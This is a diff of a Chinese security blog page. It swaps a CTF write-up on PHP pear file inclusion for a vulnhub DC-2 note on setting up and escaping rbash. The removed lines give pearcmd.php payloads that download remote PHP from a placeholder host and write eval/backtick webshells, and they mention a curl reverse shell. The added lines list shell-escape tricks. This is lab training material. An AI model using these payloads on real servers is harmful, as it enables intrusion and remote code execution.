@@ -17,19 +17,19 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
-  <title>WP：pear文件包含 - bug_001</title>
+  <title>WP：rbash - bug_001</title>
 
   
-    <meta name="description" content="pear文件包含条件：  有文件包含点 开启了pear扩展 配置文件中register_argc_argv 设置为On,而默认为Off  例题 12345678910111213&lt;?phperror_reporting(0);$file &#x3D; $_GET[&#x27;file&#x27;];if(isset($file) &amp;&amp; !preg_match(&quot;&#x2F;input|">
+    <meta name="description" content="什么是rbashrbash,即受限制的 bash,其可以用作中转服务器（实际上rbash只是bash的一个软链接）。它与一般shell的区别在于会限制一些行为，让一些命令无法执行。 如何设置rbash123456789101112131415161718191，复制一个bash，重命名为rbash        cp  &#x2F;bin&#x2F;bash  &#x2F;bin&#x2F;rbash2，设置用户tom登陆的shell为">
 <meta property="og:type" content="website">
-<meta property="og:title" content="pear文件包含">
-<meta property="og:url" content="https://cbbzx12.github.io/wiki/WP/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/pear%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+<meta property="og:title" content="rbash">
+<meta property="og:url" content="https://cbbzx12.github.io/wiki/WP/vulnhub/rbash/">
 <meta property="og:site_name" content="bug_001">
-<meta property="og:description" content="pear文件包含条件：  有文件包含点 开启了pear扩展 配置文件中register_argc_argv 设置为On,而默认为Off  例题 12345678910111213&lt;?phperror_reporting(0);$file &#x3D; $_GET[&#x27;file&#x27;];if(isset($file) &amp;&amp; !preg_match(&quot;&#x2F;input|">
+<meta property="og:description" content="什么是rbashrbash,即受限制的 bash,其可以用作中转服务器（实际上rbash只是bash的一个软链接）。它与一般shell的区别在于会限制一些行为，让一些命令无法执行。 如何设置rbash123456789101112131415161718191，复制一个bash，重命名为rbash        cp  &#x2F;bin&#x2F;bash  &#x2F;bin&#x2F;rbash2，设置用户tom登陆的shell为">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cbbzx12.github.io/images/head.jpg">
-<meta property="article:published_time" content="2025-12-24T11:20:32.086Z">
-<meta property="article:modified_time" content="2025-12-24T11:20:32.086Z">
+<meta property="article:published_time" content="2025-12-24T11:20:32.069Z">
+<meta property="article:modified_time" content="2025-12-24T11:20:32.069Z">
 <meta property="article:author" content="bug_001">
 <meta property="article:tag" content="WP">
 <meta name="twitter:card" content="summary">
@@ -49,7 +49,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Website","@id":"https://cbbzx12.github.io/wiki/WP/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/pear%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","author":{"@type":"Person","name":"bug_001","sameAs":[],"image":"/images/head.jpg"},"name":"pear文件包含","description":"pear文件包含条件：\n\n有文件包含点\n开启了pear扩展\n配置文件中register_argc_argv 设置为On,而默认为Off\n\n例题\n12345678910111213&lt;?phperror_reporting(0);$file = $_GET[&#x27;file&#x27;];if(isset($file) &amp;&amp; !preg_match(&quot;/inp...","url":"https://cbbzx12.github.io/wiki/WP/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/pear%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Website","@id":"https://cbbzx12.github.io/wiki/WP/vulnhub/rbash/","author":{"@type":"Person","name":"bug_001","sameAs":[],"image":"/images/head.jpg"},"name":"rbash","description":"什么是rbashrbash,即受限制的 bash,其可以用作中转服务器（实际上rbash只是bash的一个软链接）。它与一般shell的区别在于会限制一些行为，让一些命令无法执行。\n如何设置rbash123456789101112131415161718191，复制一个bash，重命名为rbash        cp  /bin/bash  /bin/rbash2，设置用户tom登陆的she...","url":"https://cbbzx12.github.io/wiki/WP/vulnhub/rbash/"}</script>
   
 <!-- hexo injector head_end start -->
 <style>
@@ -138,48 +138,35 @@
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
 
   <span class="sep"></span>
-  <a class="cap breadcrumb" href="/wiki/WP/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/pear%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">pear文件包含</a>
+  <a class="cap breadcrumb" href="/wiki/WP/vulnhub/rbash/">rbash</a>
   </div>
-<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2025-12-24T11:20:32.086Z">2025-12-24</time></span></div></div></div>
+<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2025-12-24T11:20:32.069Z">2025-12-24</time></span></div></div></div>
     
     <div class="bottom only-title">
       
       <div class="text-area">
-        <h1 class="text title"><span>pear文件包含</span></h1>
+        <h1 class="text title"><span>rbash</span></h1>
         
       </div>
     </div>
     
   </div>
-  </div><article class="md-text content"><h2 id="pear文件包含"><a href="#pear文件包含" class="headerlink" title="pear文件包含"></a><strong>pear文件包含</strong></h2><p><strong>条件：</strong></p>
-<ul>
-<li>有文件包含点</li>
-<li>开启了pear扩展</li>
-<li>配置文件中register_argc_argv 设置为On,而默认为Off</li>
-</ul>
-<p>例题</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($file) &amp;&amp; !preg_match(&quot;/input|data|phar|log|filter/i&quot;,$file))&#123;</span><br><span class="line">    include $file;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    if(isset($_GET[&#x27;info&#x27;]))&#123;</span><br><span class="line">        phpinfo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+  </div><article class="md-text content"><h3 id="什么是rbash"><a href="#什么是rbash" class="headerlink" title="什么是rbash"></a>什么是rbash</h3><p>rbash,即受限制的 bash,其可以用作中转服务器（实际上rbash只是bash的一个<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%BD%AF%E9%93%BE%E6%8E%A5&spm=1001.2101.3001.7020">软链接</a>）。它与一般shell的区别在于会限制一些行为，让一些命令无法执行。</p>
+<h3 id="如何设置rbash"><a href="#如何设置rbash" class="headerlink" title="如何设置rbash"></a>如何设置rbash</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1，复制一个bash，重命名为rbash</span><br><span class="line"></span><br><span class="line">        <span class="built_in">cp</span>  /bin/bash  /bin/rbash</span><br><span class="line"></span><br><span class="line">2，设置用户tom登陆的shell为rbash</span><br><span class="line"></span><br><span class="line">        useradd -s  /bin/rbash  tom</span><br><span class="line"></span><br><span class="line">3,  在tom用户下新建一个.bin目录存放可以执行的命令</span><br><span class="line"></span><br><span class="line">        <span class="built_in">mkdir</span> -p  /home/tom/.bin</span><br><span class="line"></span><br><span class="line">4,  通过软连接执行命令</span><br><span class="line"></span><br><span class="line">        <span class="built_in">ln</span> -s  /bin/clear  /home/<span class="variable">$tom</span>/.bin/clear</span><br><span class="line"></span><br><span class="line">5,  编辑文件/home/<span class="variable">$tom</span>/.bashrc,添加<span class="built_in">export</span> PATH=<span class="variable">$HOME</span>/.bin/.</span><br><span class="line">文件一定要以# .bashrc为首行.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>我们利用pear扩展进行文件包含</p>
-<h3 id="1、远程文件下载实现远程文件包含"><a href="#1、远程文件下载实现远程文件包含" class="headerlink" title="1、远程文件下载实现远程文件包含"></a><strong>1、远程文件下载实现远程文件包含</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">poc:</span><br><span class="line">/?file=/usr/local/lib/php/pearcmd.php&amp;caigo+install+R+/var/www/html/+http://xxx.xxx.xxx/1.php</span><br></pre></td></tr></table></figure>
+<h3 id="如何绕过限制"><a href="#如何绕过限制" class="headerlink" title="如何绕过限制"></a>如何绕过限制</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">tom@DC-2:~$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/home/tom/usr/bin</span><br><span class="line">tom@DC-2:~$ <span class="built_in">echo</span> /home/tom/usr/bin/*</span><br><span class="line">/home/tom/usr/bin/less /home/tom/usr/bin/ls /home/tom/usr/bin/scp /home/tom/usr/bin/vi</span><br><span class="line"></span><br><span class="line">emv 查看环境变量 特别是查看shell 和PATH</span><br><span class="line"></span><br><span class="line">检查编程语言 java php ...</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>它提示下载到这个目录”&#x2F;tmp&#x2F;pear&#x2F;download&#x2F;1.php”，我们尝试包含它</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPmA252R0ZmqwBXzCyzicqZtWJk6UqTq90Uwp8nS2cAfd2A1pOVLMSyzrTVia0w1kosib6spTTA02t7RA/640?wx_fmt=png"></p>
-<h3 id="2、生成配置文件，配置项传入我们恶意的php代码的形式"><a href="#2、生成配置文件，配置项传入我们恶意的php代码的形式" class="headerlink" title="2、生成配置文件，配置项传入我们恶意的php代码的形式"></a><strong>2、生成配置文件，配置项传入我们恶意的php代码的形式</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">poc：</span><br><span class="line">/?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/ctf.php+-d+man_dir=&lt;?eval($_POST[1]);?&gt;+-s+</span><br></pre></td></tr></table></figure>
+<h4 id="常见的逃逸技术"><a href="#常见的逃逸技术" class="headerlink" title="常见的逃逸技术"></a>常见的逃逸技术</h4><ol>
+<li>“&#x2F; ”  如果允许，直接运行&#x2F;bin&#x2F;bash</li>
+<li>cp</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /bin/bash test1</span><br><span class="line"><span class="built_in">cp</span> /bin/sh test2</span><br><span class="line">./test1 <span class="comment"># 切换到了/bin/bash</span></span><br><span class="line">./test2 <span class="comment"># 切换到了/bin/sh</span></span><br></pre></td></tr></table></figure>
 
-<p>由于hackbar会尝试编码写入的数据会变成这样<code>&quot;%3C?eval($_POST[1]);?%3E&quot;;</code>，所以我们使用burp修改一下发包</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPmA252R0ZmqwBXzCyzicqZtWPEQHKicSchBreLyicRNQ7whSVfkj9l1p5QWceEQXdWwq2ic5U2XViabxOw/640?wx_fmt=png"></p>
-<p>提示写入成功，尝试包含&#x2F;tmp&#x2F;ctf.php</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPmA252R0ZmqwBXzCyzicqZtWiboNne9oPB5iaibqwOqtUXpD9nN3ZKdkcHBicog2icRzRAz1NyGLH6JrXow/640?wx_fmt=png"></p>
-<h3 id="3、写配置文件方式"><a href="#3、写配置文件方式" class="headerlink" title="3、写配置文件方式"></a><strong>3、写配置文件方式</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">poc:</span><br><span class="line">/?file=/usr/local/lib/php/pearcmd.php&amp;aaaa+config-create+/var/www/html/&lt;?=`$_POST[1]`;?&gt;+1.php</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>常见的应用</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1 ftp,gdb,man</span><br><span class="line">    ftp&gt; !/bin/sh</span><br><span class="line">    gdb&gt; !/bin/sh</span><br><span class="line">    man&gt; !/bin/sh</span><br><span class="line">2 git </span><br><span class="line">    git &gt; git <span class="built_in">help</span> status</span><br><span class="line">3 vi/vim</span><br><span class="line">    :<span class="built_in">set</span> shell=/bin/bsah</span><br><span class="line">    :shell</span><br><span class="line">    或者</span><br><span class="line">    :!/bin/bash</span><br><span class="line">4 </span><br><span class="line">BASH_CMDS[a]=/bin/sh;a <span class="comment">#把/bin/bash给a变量</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin/    <span class="comment">#将/bin 作为PATH环境变量导出</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/bin   <span class="comment">#将/usr/bin作为PATH环境变量导出</span></span><br></pre></td></tr></table></figure>
 
-<p>由于可能会遇到前面的编码问题，我们还是用burp</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPmA252R0ZmqwBXzCyzicqZtWcfEhUJgtXv18Todv7KCP2WDQYB34o9m5ANgEnSic2RRqvC1SKiaAL5Aw/640?wx_fmt=png"></p>
-<p>然后访问网站根目录的1.php</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPmA252R0ZmqwBXzCyzicqZtWZAqiacv739ibqRSjGhjCLXOgXxx5neaZhSvs408tqzEqdoOun7Q1j0mQ/640?wx_fmt=png"></p>
-<p>因为我们写的poc是&#96;&#96;&#96;符号包起来是的命令执行，要注意不是eval,我们直接用curl反弹</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPmA252R0ZmqwBXzCyzicqZtWqVf3mTbXkUkExlCeCpicGeV9qL1xAX2KNvIBicTn0HVcc2EX2wDRQOXw/640?wx_fmt=png"></p>
-<p>除了pearcmd还有peclcmd</p>
 </article>
 <div class="article-footer">
 
@@ -197,7 +184,7 @@
 
 
 
-<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pear%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">pear文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">1、远程文件下载实现远程文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E7%94%9F%E6%88%90%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%8C%E9%85%8D%E7%BD%AE%E9%A1%B9%E4%BC%A0%E5%85%A5%E6%88%91%E4%BB%AC%E6%81%B6%E6%84%8F%E7%9A%84php%E4%BB%A3%E7%A0%81%E7%9A%84%E5%BD%A2%E5%BC%8F"><span class="toc-text">2、生成配置文件，配置项传入我们恶意的php代码的形式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E5%86%99%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%96%B9%E5%BC%8F"><span class="toc-text">3、写配置文件方式</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFrbash"><span class="toc-text">什么是rbash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AErbash"><span class="toc-text">如何设置rbash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6"><span class="toc-text">如何绕过限制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E9%80%83%E9%80%B8%E6%8A%80%E6%9C%AF"><span class="toc-text">常见的逃逸技术</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
 </div></aside><div class='float-panel'>
   <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
     <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
